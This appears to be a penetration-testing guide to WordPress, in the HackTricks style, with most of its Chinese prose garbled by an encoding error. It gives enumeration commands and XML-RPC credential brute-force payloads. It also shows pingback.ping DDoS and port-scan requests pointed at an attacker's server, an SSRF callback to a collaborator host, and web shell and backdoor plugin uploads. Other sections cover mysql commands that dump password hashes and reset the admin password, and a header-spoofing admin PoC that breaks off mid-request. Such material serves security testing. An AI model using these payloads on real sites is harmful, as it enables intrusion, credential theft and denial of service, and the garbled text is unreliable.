# Wordpress

{{#include ../../banners/hacktricks-training.md}}

## åŸºæœ¬ä¿¡æ¯

- **Uploaded** æ–‡ä»¶å­˜æ”¾äº: `http://10.10.10.10/wp-content/uploads/2018/08/a.txt`
- **Themes files can be found in /wp-content/themes/,** æ‰€ä»¥å¦‚æœä½ ä¿®æ”¹ä¸»é¢˜çš„æŸäº› php æ¥è·å– RCEï¼Œä½ å¾ˆå¯èƒ½ä¼šä½¿ç”¨è¯¥è·¯å¾„ã€‚ä¾‹å¦‚ï¼šä½¿ç”¨ **theme twentytwelve** ä½ å¯ä»¥ **access** the **404.php** file in: [**/wp-content/themes/twentytwelve/404.php**](http://10.11.1.234/wp-content/themes/twentytwelve/404.php)

- **Another useful url could be:** [**/wp-content/themes/default/404.php**](http://10.11.1.234/wp-content/themes/twentytwelve/404.php)

- åœ¨ **wp-config.php** ä¸­ä½ å¯ä»¥æ‰¾åˆ°æ•°æ®åº“çš„ root å¯†ç ã€‚
- é»˜è®¤ç™»å½•è·¯å¾„å¯æ£€æŸ¥: _**/wp-login.php, /wp-login/, /wp-admin/, /wp-admin.php, /login/**_

### **Main WordPress Files**

- `index.php`
- `license.txt` åŒ…å«æœ‰ç”¨ä¿¡æ¯ï¼Œä¾‹å¦‚å®‰è£…çš„ WordPress ç‰ˆæœ¬ã€‚
- `wp-activate.php` åœ¨è®¾ç½®æ–° WordPress ç«™ç‚¹æ—¶ç”¨äºç”µå­é‚®ä»¶æ¿€æ´»æµç¨‹ã€‚
- ç™»å½•æ–‡ä»¶å¤¹ï¼ˆå¯èƒ½è¢«é‡å‘½åä»¥éšè—ï¼‰:
- `/wp-admin/login.php`
- `/wp-admin/wp-login.php`
- `/login.php`
- `/wp-login.php`
- `xmlrpc.php` æ˜¯ä¸€ä¸ªè¡¨ç¤º WordPress åŠŸèƒ½çš„æ–‡ä»¶ï¼Œè¯¥åŠŸèƒ½å…è®¸ä»¥ HTTP ä½œä¸ºä¼ è¾“æœºåˆ¶ã€ä»¥ XML ä½œä¸ºç¼–ç æœºåˆ¶æ¥ä¼ è¾“æ•°æ®ã€‚æ­¤ç±»é€šä¿¡å·²è¢« WordPress çš„ [REST API](https://developer.wordpress.org/rest-api/reference) æ‰€å–ä»£ã€‚
- `wp-content` æ–‡ä»¶å¤¹æ˜¯å­˜æ”¾æ’ä»¶å’Œä¸»é¢˜çš„ä¸»è¦ç›®å½•ã€‚
- `wp-content/uploads/` æ˜¯å¹³å°ä¸Šä¸Šä¼ æ–‡ä»¶å­˜å‚¨çš„ç›®å½•ã€‚
- `wp-includes/` æ˜¯å­˜æ”¾æ ¸å¿ƒæ–‡ä»¶çš„ç›®å½•ï¼Œä¾‹å¦‚è¯ä¹¦ã€å­—ä½“ã€JavaScript æ–‡ä»¶å’Œå°éƒ¨ä»¶ã€‚
- `wp-sitemap.xml` åœ¨ WordPress 5.5 åŠæ›´é«˜ç‰ˆæœ¬ä¸­ï¼ŒWordPress ä¼šç”Ÿæˆä¸€ä¸ªåŒ…å«æ‰€æœ‰å…¬å¼€å¸–å­å’Œå¯å…¬å¼€æŸ¥è¯¢çš„å¸–å­ç±»å‹ä¸åˆ†ç±»æ³•çš„ sitemap XML æ–‡ä»¶ã€‚

**Post exploitation**

- `wp-config.php` æ–‡ä»¶åŒ…å« WordPress è¿æ¥æ•°æ®åº“æ‰€éœ€çš„ä¿¡æ¯ï¼Œä¾‹å¦‚æ•°æ®åº“åã€æ•°æ®åº“ä¸»æœºã€ç”¨æˆ·åå’Œå¯†ç ã€authentication keys and saltsï¼Œä»¥åŠæ•°æ®åº“è¡¨å‰ç¼€ã€‚è¯¥é…ç½®æ–‡ä»¶ä¹Ÿå¯ä»¥ç”¨äºå¯ç”¨ DEBUG æ¨¡å¼ï¼Œè¿™åœ¨æ’é”™æ—¶å¾ˆæœ‰ç”¨ã€‚

### Users Permissions

- **Administrator**
- **Editor**: å‘å¸ƒå¹¶ç®¡ç†è‡ªå·±ä¸ä»–äººçš„æ–‡ç« 
- **Author**: å‘å¸ƒå¹¶ç®¡ç†è‡ªå·±çš„æ–‡ç« 
- **Contributor**: ç¼–å†™å¹¶ç®¡ç†è‡ªå·±çš„æ–‡ç« ä½†ä¸èƒ½å‘å¸ƒå®ƒä»¬
- **Subscriber**: æŸ¥çœ‹æ–‡ç« å¹¶ç¼–è¾‘ä»–ä»¬çš„ä¸ªäººèµ„æ–™

## **Passive Enumeration**

### **Get WordPress version**

æ£€æŸ¥æ˜¯å¦èƒ½æ‰¾åˆ°æ–‡ä»¶ `/license.txt` æˆ– `/readme.html`

åœ¨é¡µé¢çš„ **æºä»£ç ** ä¸­ï¼ˆç¤ºä¾‹æ¥è‡ª [https://wordpress.org/support/article/pages/](https://wordpress.org/support/article/pages/ï¼‰ï¼‰:

- grep
```bash
curl https://victim.com/ | grep 'content="WordPress'
```
- `meta name`

![](<../../images/image (1111).png>)

- CSS é“¾æ¥æ–‡ä»¶

![](<../../images/image (533).png>)

- JavaScript æ–‡ä»¶

![](<../../images/image (524).png>)

### è·å–æ’ä»¶
```bash
curl -H 'Cache-Control: no-cache, no-store' -L -ik -s https://wordpress.org/support/article/pages/ | grep -E 'wp-content/plugins/' | sed -E 's,href=|src=,THIIIIS,g' | awk -F "THIIIIS" '{print $2}' | cut -d "'" -f2
```
### è·å–ä¸»é¢˜
```bash
curl -s -X GET https://wordpress.org/support/article/pages/ | grep -E 'wp-content/themes' | sed -E 's,href=|src=,THIIIIS,g' | awk -F "THIIIIS" '{print $2}' | cut -d "'" -f2
```
### æå–ç‰ˆæœ¬ä¿¡æ¯ï¼ˆé€šç”¨ï¼‰
```bash
curl -H 'Cache-Control: no-cache, no-store' -L -ik -s https://wordpress.org/support/article/pages/ | grep http | grep -E '?ver=' | sed -E 's,href=|src=,THIIIIS,g' | awk -F "THIIIIS" '{print $2}' | cut -d "'" -f2

```
## ä¸»åŠ¨æšä¸¾

### æ’ä»¶å’Œä¸»é¢˜

ä½ å¯èƒ½æ— æ³•æ‰¾åˆ°æ‰€æœ‰æ’ä»¶å’Œä¸»é¢˜ã€‚ä¸ºäº†å‘ç°å®ƒä»¬ï¼Œä½ éœ€è¦**ä¸»åŠ¨å¯¹æ’ä»¶å’Œä¸»é¢˜åˆ—è¡¨è¿›è¡Œ Brute Force**ï¼ˆå¸Œæœ›æœ‰è‡ªåŠ¨åŒ–å·¥å…·åŒ…å«è¿™äº›åˆ—è¡¨ï¼‰ã€‚

### ç”¨æˆ·

- **ID Brute:** é€šè¿‡ Brute Forcing ç”¨æˆ· IDï¼Œå¯ä» WordPress ç«™ç‚¹è·å–æœ‰æ•ˆç”¨æˆ·ï¼š
```bash
curl -s -I -X GET http://blog.example.com/?author=1
```
å¦‚æœå“åº”ä¸º **200** æˆ– **30X**ï¼Œåˆ™è¡¨ç¤ºè¯¥ id æ˜¯ **æœ‰æ•ˆçš„**ã€‚å¦‚æœå“åº”ä¸º **400**ï¼Œåˆ™è¯¥ id **æ— æ•ˆ**ã€‚

- **wp-json:** ä½ è¿˜å¯ä»¥å°è¯•é€šè¿‡æŸ¥è¯¢æ¥è·å–æœ‰å…³ç”¨æˆ·çš„ä¿¡æ¯ï¼š
```bash
curl http://blog.example.com/wp-json/wp/v2/users
```
å¦ä¸€ä¸ªä¼šæ˜¾ç¤ºä¸€äº›ç”¨æˆ·ä¿¡æ¯çš„ `/wp-json/` ç«¯ç‚¹æ˜¯ï¼š
```bash
curl http://blog.example.com/wp-json/oembed/1.0/embed?url=POST-URL
```
æ³¨æ„ï¼Œè¯¥ç«¯ç‚¹ä»…ä¼šæš´éœ²æ›¾å‘è¡¨è¿‡æ–‡ç« çš„ç”¨æˆ·ã€‚**ä»…ä¼šæä¾›å¯ç”¨äº†æ­¤åŠŸèƒ½çš„ç”¨æˆ·çš„ä¿¡æ¯**ã€‚

å¦è¯·æ³¨æ„ï¼Œ**/wp-json/wp/v2/pages** å¯èƒ½ä¼š leak IP åœ°å€ã€‚

- **Login username enumeration**: åœ¨é€šè¿‡ **`/wp-login.php`** ç™»å½•æ—¶ï¼Œ**æ¶ˆæ¯** ä¼š **ä¸åŒ**ï¼Œç”¨ä»¥æŒ‡ç¤º **ç”¨æˆ·åæ˜¯å¦å­˜åœ¨**ã€‚

### XML-RPC

å¦‚æœ `xml-rpc.php` å¯ç”¨ï¼Œä½ å¯ä»¥æ‰§è¡Œ credentials brute-forceï¼Œæˆ–åˆ©ç”¨å®ƒå¯¹å…¶ä»–èµ„æºå‘èµ· DoS attacksã€‚ï¼ˆä¾‹å¦‚ï¼Œä½ å¯ä»¥è‡ªåŠ¨åŒ–æ­¤è¿‡ç¨‹[ using this](https://github.com/relarizky/wpxploit)ï¼‰ã€‚

è¦æ£€æŸ¥å®ƒæ˜¯å¦å¯ç”¨ï¼Œå°è¯•è®¿é—® _**/xmlrpc.php**_ å¹¶å‘é€ä»¥ä¸‹è¯·æ±‚ï¼š

**æ£€æŸ¥**
```html
<methodCall>
<methodName>system.listMethods</methodName>
<params></params>
</methodCall>
```
![](https://h3llwings.files.wordpress.com/2019/01/list-of-functions.png?w=656)

**Credentials Bruteforce**

**`wp.getUserBlogs`**, **`wp.getCategories`** or **`metaWeblog.getUsersBlogs`** æ˜¯ä¸€äº›å¯ä»¥ç”¨æ¥ brute-force credentials çš„æ–¹æ³•ã€‚å¦‚æœä½ èƒ½æ‰¾åˆ°å…¶ä¸­ä»»ä½•ä¸€ä¸ªï¼Œä½ å¯ä»¥å‘é€å¦‚ä¸‹å†…å®¹ï¼š
```html
<methodCall>
<methodName>wp.getUsersBlogs</methodName>
<params>
<param><value>admin</value></param>
<param><value>pass</value></param>
</params>
</methodCall>
```
å¦‚æœå‡­è¯æ— æ•ˆï¼Œåˆ™åœ¨ 200 å“åº”ä¸­åº”å‡ºç°æ¶ˆæ¯ _"Incorrect username or password"_ã€‚

![](<../../images/image (107) (2) (2) (2) (2) (2) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (2) (4) (1).png>)

![](<../..//images/image (721).png>)

ä½¿ç”¨æ­£ç¡®çš„å‡­è¯å¯ä»¥ä¸Šä¼ æ–‡ä»¶ã€‚åœ¨å“åº”ä¸­ä¼šå‡ºç°è¯¥è·¯å¾„ ([https://gist.github.com/georgestephanis/5681982](https://gist.github.com/georgestephanis/5681982))
```html
<?xml version='1.0' encoding='utf-8'?>
<methodCall>
<methodName>wp.uploadFile</methodName>
<params>
<param><value><string>1</string></value></param>
<param><value><string>username</string></value></param>
<param><value><string>password</string></value></param>
<param>
<value>
<struct>
<member>
<name>name</name>
<value><string>filename.jpg</string></value>
</member>
<member>
<name>type</name>
<value><string>mime/type</string></value>
</member>
<member>
<name>bits</name>
<value><base64><![CDATA[---base64-encoded-data---]]></base64></value>
</member>
</struct>
</value>
</param>
</params>
</methodCall>
```
å¦å¤–ï¼Œæœ‰ä¸€ç§ **æ›´å¿«çš„æ–¹å¼** ä½¿ç”¨ **`system.multicall`** å¯¹å‡­è¯è¿›è¡Œæš´åŠ›ç ´è§£ï¼Œå› ä¸ºä½ å¯ä»¥åœ¨åŒä¸€ä¸ªè¯·æ±‚ä¸­å°è¯•å¤šä¸ªå‡­è¯ï¼š

<figure><img src="../../images/image (628).png" alt=""><figcaption></figcaption></figure>

**ç»•è¿‡ 2FA**

æ­¤æ–¹æ³•æ˜¯ä¸ºç¨‹åºè€Œéäººå·¥äº¤äº’è®¾è®¡çš„ï¼Œä¸”è¾ƒä¸ºå¤è€ï¼Œå› æ­¤ä¸æ”¯æŒ 2FAã€‚  
å› æ­¤ï¼Œå¦‚æœä½ æœ‰æœ‰æ•ˆçš„ creds ä½†ä¸»å…¥å£å— 2FA ä¿æŠ¤ï¼Œ**ä½ å¯èƒ½èƒ½å¤Ÿæ»¥ç”¨ xmlrpc.php ä½¿ç”¨è¿™äº› creds ç™»å½•ï¼Œä»è€Œç»•è¿‡ 2FA**ã€‚æ³¨æ„ï¼Œä½ æ— æ³•æ‰§è¡Œé€šè¿‡æ§åˆ¶å°èƒ½åšçš„æ‰€æœ‰æ“ä½œï¼Œä½†ä½ ä»å¯èƒ½è¾¾åˆ° RCEï¼Œæ­£å¦‚ Ippsec åœ¨ [https://www.youtube.com/watch?v=p8mIdm93mfw\&t=1130s](https://www.youtube.com/watch?v=p8mIdm93mfw&t=1130s) ä¸­è§£é‡Šçš„é‚£æ ·ã€‚

**DDoS æˆ–ç«¯å£æ‰«æ**

å¦‚æœä½ èƒ½åœ¨æ–¹æ³•åˆ—è¡¨ä¸­æ‰¾åˆ° _**pingback.ping**_ï¼Œä½ å¯ä»¥è®© Wordpress å‘ä»»æ„ä¸»æœº/ç«¯å£å‘é€ä»»æ„è¯·æ±‚ã€‚\
è¿™å¯ä»¥ç”¨æ¥è®© **æˆåƒä¸Šä¸‡** çš„ Wordpress **ç«™ç‚¹** å» **è®¿é—®** åŒä¸€ **åœ°å€**ï¼ˆä»è€Œåœ¨è¯¥å¤„è§¦å‘ **DDoS**ï¼‰ï¼Œæˆ–è€…ç”¨æ¥è®© **Wordpress** å» **æ‰«æ** æŸäº›å†…éƒ¨ **ç½‘ç»œ**ï¼ˆä½ å¯ä»¥æŒ‡å®šä»»æ„ç«¯å£ï¼‰ã€‚
```html
<methodCall>
<methodName>pingback.ping</methodName>
<params><param>
<value><string>http://<YOUR SERVER >:<port></string></value>
</param><param><value><string>http://<SOME VALID BLOG FROM THE SITE ></string>
</value></param></params>
</methodCall>
```
![](../../images/1_JaUYIZF8ZjDGGB7ocsZC-g.png)

å¦‚æœä½ å¾—åˆ° **faultCode** å€¼å¤§äº **0**ï¼ˆ17ï¼‰ï¼Œåˆ™è¡¨ç¤ºç«¯å£æ˜¯å¼€æ”¾çš„ã€‚

æŸ¥çœ‹å‰ä¸€èŠ‚ä¸­å¯¹ **`system.multicall`** çš„ç”¨æ³•ï¼Œå­¦ä¹ å¦‚ä½•æ»¥ç”¨æ­¤æ–¹æ³•æ¥é€ æˆ DDoSã€‚

**DDoS**
```html
<methodCall>
<methodName>pingback.ping</methodName>
<params>
<param><value><string>http://target/</string></value></param>
<param><value><string>http://yoursite.com/and_some_valid_blog_post_url</string></value></param>
</params>
</methodCall>
```
![](<../../images/image (110).png>)

### wp-cron.php DoS

è¯¥æ–‡ä»¶é€šå¸¸å­˜åœ¨äº Wordpress ç«™ç‚¹çš„æ ¹ç›®å½•ï¼š**`/wp-cron.php`**\
å½“æ­¤æ–‡ä»¶è¢«**è®¿é—®**æ—¶ï¼Œä¼šæ‰§è¡Œä¸€æ¬¡**â€œé‡â€** MySQL **æŸ¥è¯¢**ï¼Œå› æ­¤**æ”»å‡»è€…**å¯ä»¥åˆ©ç”¨å®ƒ**å¯¼è‡´** **DoS**ã€‚\
æ­¤å¤–ï¼Œé»˜è®¤æƒ…å†µä¸‹ï¼Œ`wp-cron.php` ä¼šåœ¨æ¯æ¬¡é¡µé¢åŠ è½½æ—¶è¢«è°ƒç”¨ï¼ˆä»»ä½•å®¢æˆ·ç«¯è¯·æ±‚ä»»ä½• Worpress é¡µé¢æ—¶ï¼‰ï¼Œåœ¨é«˜æµé‡ç«™ç‚¹ä¸Šå¯èƒ½å¯¼è‡´é—®é¢˜ï¼ˆDoSï¼‰ã€‚

å»ºè®®ç¦ç”¨ Wp-Cronï¼Œå¹¶åœ¨ä¸»æœºå†…åˆ›å»ºä¸€ä¸ªçœŸå®çš„ cronjobï¼Œä»¥å®šæœŸæ‰§è¡Œæ‰€éœ€æ“ä½œï¼ˆé¿å…å¼•å‘é—®é¢˜ï¼‰ã€‚

### /wp-json/oembed/1.0/proxy - SSRF

å°è¯•è®¿é—® _https://worpress-site.com/wp-json/oembed/1.0/proxy?url=ybdk28vjsa9yirr7og2lukt10s6ju8.burpcollaborator.net_ï¼ŒWorpress ç«™ç‚¹å¯èƒ½ä¼šå‘ä½ å‘èµ·è¯·æ±‚ã€‚

This is the response when it doesn't work:

![](<../../images/image (365).png>)

## SSRF


{{#ref}}
https://github.com/t0gu/quickpress/blob/master/core/requests.go
{{#endref}}

è¯¥å·¥å…·ä¼šæ£€æŸ¥æ˜¯å¦å­˜åœ¨ **methodName: pingback.ping** ä»¥åŠè·¯å¾„ **/wp-json/oembed/1.0/proxy**ï¼Œå¦‚æœå­˜åœ¨ï¼Œåˆ™å°è¯•åˆ©ç”¨å®ƒä»¬ã€‚

## è‡ªåŠ¨åŒ–å·¥å…·
```bash
cmsmap -s http://www.domain.com -t 2 -a "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:69.0) Gecko/20100101 Firefox/69.0"
wpscan --rua -e ap,at,tt,cb,dbe,u,m --url http://www.domain.com [--plugins-detection aggressive] --api-token <API_TOKEN> --passwords /usr/share/wordlists/external/SecLists/Passwords/probable-v2-top1575.txt #Brute force found users and search for vulnerabilities using a free API token (up 50 searchs)
#You can try to bruteforce the admin user using wpscan with "-U admin"
```
## é€šè¿‡è¦†ç›–ä¸€ä½è·å–è®¿é—®æƒé™

è¿™æ›´å¤šæ˜¯ä¸ªå¥½å¥‡çš„ä¾‹å­ï¼Œè€Œä¸æ˜¯çœŸæ­£çš„æ”»å‡»ã€‚åœ¨ CTF [https://github.com/orangetw/My-CTF-Web-Challenges#one-bit-man](https://github.com/orangetw/My-CTF-Web-Challenges#one-bit-man) ä¸­ï¼Œä½ å¯ä»¥ç¿»è½¬ä»»æ„ wordpress æ–‡ä»¶çš„ 1 bitã€‚æ‰€ä»¥ä½ å¯ä»¥ç¿»è½¬æ–‡ä»¶ `/var/www/html/wp-includes/user.php` çš„ä½ç½® `5389`ï¼Œä»¥ NOP æ‰ NOT (`!`) æ“ä½œã€‚
```php
if ( ! wp_check_password( $password, $user->user_pass, $user->ID ) ) {
return new WP_Error(
```
## **é¢æ¿ RCE**

**ä¿®æ”¹æ‰€ç”¨ä¸»é¢˜ä¸­çš„ phpï¼ˆéœ€è¦ admin å‡­è¯ï¼‰**

å¤–è§‚ â†’ ä¸»é¢˜ç¼–è¾‘å™¨ â†’ 404 Templateï¼ˆåœ¨å³ä¾§ï¼‰

å°†å†…å®¹æ›´æ”¹ä¸º php shellï¼š

![](<../../images/image (384).png>)

åœ¨äº’è”ç½‘ä¸Šæœç´¢å¦‚ä½•è®¿é—®è¯¥å·²æ›´æ–°é¡µé¢ã€‚åœ¨æœ¬ä¾‹ä¸­ï¼Œä½ éœ€è¦è®¿é—®ï¼š [http://10.11.1.234/wp-content/themes/twentytwelve/404.php](http://10.11.1.234/wp-content/themes/twentytwelve/404.php)

### MSF

ä½ å¯ä»¥ä½¿ç”¨ï¼š
```bash
use exploit/unix/webapp/wp_admin_shell_upload
```
ä»¥è·å–ä¼šè¯ã€‚

## Plugin RCE

### PHP plugin

å¯èƒ½å¯ä»¥å°† .php æ–‡ä»¶ä½œä¸º plugin ä¸Šä¼ ã€‚\
åˆ›å»ºä½ çš„ php backdoorï¼Œä¾‹å¦‚ä½¿ç”¨ï¼š

![](<../../images/image (183).png>)

ç„¶åæ·»åŠ ä¸€ä¸ªæ–°çš„ pluginï¼š

![](<../../images/image (722).png>)

Upload plugin å¹¶æŒ‰ Install Nowï¼š

![](<../../images/image (249).png>)

ç‚¹å‡» Proccedï¼š

![](<../../images/image (70).png>)

è¿™çœ‹èµ·æ¥å¯èƒ½ä¸ä¼šæœ‰ä»»ä½•ååº”ï¼Œä½†å¦‚æœä½ è½¬åˆ° Mediaï¼Œä½ ä¼šçœ‹åˆ°ä¸Šä¼ çš„ shellï¼š

![](<../../images/image (462).png>)

è®¿é—®å®ƒï¼Œä½ ä¼šçœ‹åˆ°ç”¨äºæ‰§è¡Œ reverse shell çš„ URLï¼š

![](<../../images/image (1006).png>)

### Uploading and activating malicious plugin

è¯¥æ–¹æ³•æ¶‰åŠå®‰è£…å·²çŸ¥å­˜åœ¨æ¼æ´çš„æ¶æ„ pluginï¼Œå¹¶å¯è¢«åˆ©ç”¨ä»¥è·å– web shellã€‚è¯¥è¿‡ç¨‹é€šè¿‡ WordPress dashboard æ‰§è¡Œï¼Œæ­¥éª¤å¦‚ä¸‹ï¼š

1. **Plugin Acquisition**: ä»è¯¸å¦‚ Exploit DB çš„æ¥æºè·å–è¯¥ pluginï¼Œä¾‹å¦‚ [**here**](https://www.exploit-db.com/exploits/36374).
2. **Plugin Installation**:
- å¯¼èˆªåˆ° WordPress dashboardï¼Œç„¶åè¿›å…¥ `Dashboard > Plugins > Upload Plugin`ã€‚
- ä¸Šä¼ ä¸‹è½½çš„ plugin çš„ zip æ–‡ä»¶ã€‚
3. **Plugin Activation**: plugin å®‰è£…æˆåŠŸåï¼Œå¿…é¡»é€šè¿‡ dashboard æ¿€æ´»ã€‚
4. **Exploitation**:
- å®‰è£…å¹¶æ¿€æ´» reflex-gallery plugin åï¼Œç”±äºå…¶å·²çŸ¥å­˜åœ¨æ¼æ´ï¼Œå¯ä»¥å¯¹å…¶è¿›è¡Œåˆ©ç”¨ã€‚
- Metasploit framework ä¸ºè¯¥æ¼æ´æä¾›äº† exploitã€‚é€šè¿‡åŠ è½½ç›¸åº”æ¨¡å—å¹¶æ‰§è¡Œç‰¹å®šå‘½ä»¤ï¼Œå¯å»ºç«‹ meterpreter ä¼šè¯ï¼Œä»è€Œè·å–å¯¹ç«™ç‚¹çš„æœªæˆæƒè®¿é—®ã€‚
- è¯·æ³¨æ„ï¼Œè¿™åªæ˜¯åˆ©ç”¨ WordPress ç«™ç‚¹çš„ä¼—å¤šæ–¹æ³•ä¹‹ä¸€ã€‚

å†…å®¹åŒ…æ‹¬å±•ç¤ºåœ¨ WordPress ä»ªè¡¨ç›˜ä¸­å®‰è£…å’Œæ¿€æ´» plugin æ­¥éª¤çš„å›¾ç¤ºã€‚ä¸è¿‡éœ€è¦æ³¨æ„çš„æ˜¯ï¼Œåœ¨æ²¡æœ‰é€‚å½“æˆæƒçš„æƒ…å†µä¸‹ä»¥è¿™ç§æ–¹å¼åˆ©ç”¨æ¼æ´æ˜¯éæ³•ä¸”ä¸é“å¾·çš„ã€‚è¯¥ä¿¡æ¯åº”è´Ÿè´£ä»»åœ°ä½¿ç”¨ï¼Œå¹¶ä»…åœ¨åˆæ³•æƒ…å¢ƒä¸‹ï¼Œä¾‹å¦‚å…·æœ‰æ˜ç¡®è®¸å¯çš„ penetration testing æ—¶ä½¿ç”¨ã€‚

**For more detailed steps check:** [**https://www.hackingarticles.in/wordpress-reverse-shell/**](https://www.hackingarticles.in/wordpress-reverse-shell/)

## ä» XSS åˆ° RCE

- [**WPXStrike**](https://github.com/nowak0x01/WPXStrike): _**WPXStrike**_ æ˜¯ä¸€ä¸ªè„šæœ¬ï¼Œæ—¨åœ¨å°† **Cross-Site Scripting (XSS)** æ¼æ´å‡çº§ä¸º **Remote Code Execution (RCE)** æˆ–å…¶ä»– WordPress çš„ä¸¥é‡æ¼æ´ã€‚æ›´å¤šä¿¡æ¯è¯·æŸ¥çœ‹ [**this post**](https://nowak0x01.github.io/papers/76bc0832a8f682a7e0ed921627f85d1d.html)ã€‚å®ƒæä¾›å¯¹ Wordpress 6.X.Xã€5.X.X å’Œ 4.X.X ç‰ˆæœ¬çš„æ”¯æŒï¼Œå¹¶å…è®¸ï¼š
- _**Privilege Escalation:**_ åœ¨ WordPress ä¸­åˆ›å»ºä¸€ä¸ªç”¨æˆ·ã€‚
- _**(RCE) Custom Plugin (backdoor) Upload:**_ å°†ä½ çš„è‡ªå®šä¹‰ plugin (backdoor) ä¸Šä¼ åˆ° WordPressã€‚
- _**(RCE) Built-In Plugin Edit:**_ ç¼–è¾‘ WordPress å†…ç½®çš„ pluginã€‚
- _**(RCE) Built-In Theme Edit:**_ ç¼–è¾‘ WordPress å†…ç½®çš„ themeã€‚
- _**(Custom) Custom Exploits:**_ ä¸ºç¬¬ä¸‰æ–¹ WordPress plugins/themes æä¾›è‡ªå®šä¹‰ exploitsã€‚

## Post Exploitation

æå–ç”¨æˆ·åå’Œå¯†ç ï¼š
```bash
mysql -u <USERNAME> --password=<PASSWORD> -h localhost -e "use wordpress;select concat_ws(':', user_login, user_pass) from wp_users;"
```
æ›´æ”¹ admin å¯†ç :
```bash
mysql -u <USERNAME> --password=<PASSWORD> -h localhost -e "use wordpress;UPDATE wp_users SET user_pass=MD5('hacked') WHERE ID = 1;"
```
## Wordpress æ’ä»¶ Pentest

### æ”»å‡»é¢

äº†è§£ Wordpress æ’ä»¶å¦‚ä½•æš´éœ²åŠŸèƒ½æ˜¯å‘ç°å…¶åŠŸèƒ½æ€§æ¼æ´çš„å…³é”®ã€‚ä½ å¯ä»¥åœ¨ä¸‹é¢çš„è¦ç‚¹ä¸­çœ‹åˆ°æ’ä»¶å¯èƒ½å¦‚ä½•æš´éœ²åŠŸèƒ½ï¼Œä»¥åŠä¸€äº›æ˜“å—æ”»å‡»æ’ä»¶çš„ç¤ºä¾‹ï¼Œè¯¦è§ [**this blog post**](https://nowotarski.info/wordpress-nonce-authorization/).

- **`wp_ajax`**

æ’ä»¶æš´éœ²ç»™ç”¨æˆ·åŠŸèƒ½çš„æ–¹å¼ä¹‹ä¸€æ˜¯é€šè¿‡ AJAX å¤„ç†ç¨‹åºã€‚è¿™äº›å¤„ç†ç¨‹åºå¯èƒ½åŒ…å«é€»è¾‘ã€æˆæƒæˆ–è®¤è¯æ¼æ´ã€‚æ­¤å¤–ï¼Œè¿™ç±»å‡½æ•°å¾ˆå¸¸è§åœ°å°†è®¤è¯å’Œæˆæƒéƒ½åŸºäº wordpress nonce çš„å­˜åœ¨ï¼Œè€Œ **ä»»ä½•åœ¨è¯¥ Wordpress å®ä¾‹ä¸­å·²éªŒè¯çš„ç”¨æˆ·éƒ½å¯èƒ½æ‹¥æœ‰**ï¼ˆä¸å…¶è§’è‰²æ— å…³ï¼‰ã€‚

ä¸‹é¢æ˜¯å¯ç”¨äºåœ¨æ’ä»¶ä¸­æš´éœ²åŠŸèƒ½çš„å‡½æ•°ï¼š
```php
add_action( 'wp_ajax_action_name', array(&$this, 'function_name'));
add_action( 'wp_ajax_nopriv_action_name', array(&$this, 'function_name'));
```
**ä½¿ç”¨ `nopriv` ä¼šä½¿è¯¥ endpoint å¯è¢«ä»»ä½•ç”¨æˆ·è®¿é—®ï¼ˆç”šè‡³æœªè®¤è¯çš„ç”¨æˆ·ï¼‰ã€‚**

> [!CAUTION]
> æ­¤å¤–ï¼Œå¦‚æœå‡½æ•°åªæ˜¯ä½¿ç”¨ `wp_verify_nonce` æ¥æ£€æŸ¥ç”¨æˆ·çš„æˆæƒï¼Œè¯¥å‡½æ•°é€šå¸¸åªæ˜¯æ£€æŸ¥ç”¨æˆ·æ˜¯å¦å·²ç™»å½•ï¼Œå¹¶ä¸ä¼šæ£€æŸ¥ç”¨æˆ·çš„è§’è‰²ã€‚å› æ­¤ä½æƒé™ç”¨æˆ·å¯èƒ½èƒ½å¤Ÿè®¿é—®é«˜æƒé™æ“ä½œã€‚

- **REST API**

ä¹Ÿå¯ä»¥é€šè¿‡åœ¨ WordPress ä¸­ä½¿ç”¨ `register_rest_route` å‡½æ•°æ³¨å†Œ REST API æ¥å…¬å¼€å‡½æ•°ï¼š
```php
register_rest_route(
$this->namespace, '/get/', array(
'methods' => WP_REST_Server::READABLE,
'callback' => array($this, 'getData'),
'permission_callback' => '__return_true'
)
);
```
The `permission_callback` is a callback to function that checks if a given user is authorized to call the API method.

**If the built-in `__return_true` function is used, it'll simply skip user permissions check.**

- **ç›´æ¥è®¿é—® php æ–‡ä»¶**

å½“ç„¶ï¼ŒWordpress ä½¿ç”¨ PHPï¼Œæ’ä»¶å†…éƒ¨çš„æ–‡ä»¶å¯ä»¥ä» web ç›´æ¥è®¿é—®ã€‚å› æ­¤ï¼Œå¦‚æœæŸä¸ªæ’ä»¶æš´éœ²äº†ä»…éœ€è®¿é—®è¯¥æ–‡ä»¶å³å¯è§¦å‘çš„æ˜“å—æ”»å‡»åŠŸèƒ½ï¼Œé‚£ä¹ˆä»»ä½•ç”¨æˆ·éƒ½å¯ä»¥åˆ©ç”¨å®ƒã€‚

### Trusted-header REST impersonation (WooCommerce Payments â‰¤ 5.6.1)

ä¸€äº›æ’ä»¶ä¸ºå†…éƒ¨é›†æˆæˆ–åå‘ä»£ç†å®ç°äº†â€œtrusted headerâ€å¿«æ·æ–¹å¼ï¼Œç„¶åä½¿ç”¨è¯¥ header ä¸º REST è¯·æ±‚è®¾ç½®å½“å‰ç”¨æˆ·ä¸Šä¸‹æ–‡ã€‚å¦‚æœè¯¥ header æœªè¢«ä¸Šæ¸¸ç»„ä»¶ä»¥åŠ å¯†æ–¹å¼ç»‘å®šåˆ°è¯·æ±‚ï¼Œæ”»å‡»è€…å°±å¯ä»¥ä¼ªé€ å®ƒå¹¶ä»¥ç®¡ç†å‘˜èº«ä»½è®¿é—®æœ‰æƒé™çš„ REST è·¯ç”±ã€‚

- Impact: æœªè®¤è¯çš„æƒé™æå‡åˆ° adminï¼Œé€šè¿‡æ ¸å¿ƒ users REST è·¯ç”±åˆ›å»ºæ–°çš„ç®¡ç†å‘˜ã€‚
- Example header: `X-Wcpay-Platform-Checkout-User: 1`ï¼ˆå¼ºåˆ¶ user ID 1ï¼Œé€šå¸¸æ˜¯ç¬¬ä¸€ä¸ªç®¡ç†å‘˜å¸å·ï¼‰ã€‚
- Exploited route: `POST /wp-json/wp/v2/users`ï¼Œä½¿ç”¨æå‡çš„ role æ•°ç»„ã€‚

PoC
```http
POST /wp-json/wp/v2/users HTTP/1.1
Host: <WP HOST>
User-Agent: Mozilla/5.0
Accept: application/json
Content-Type: application/json
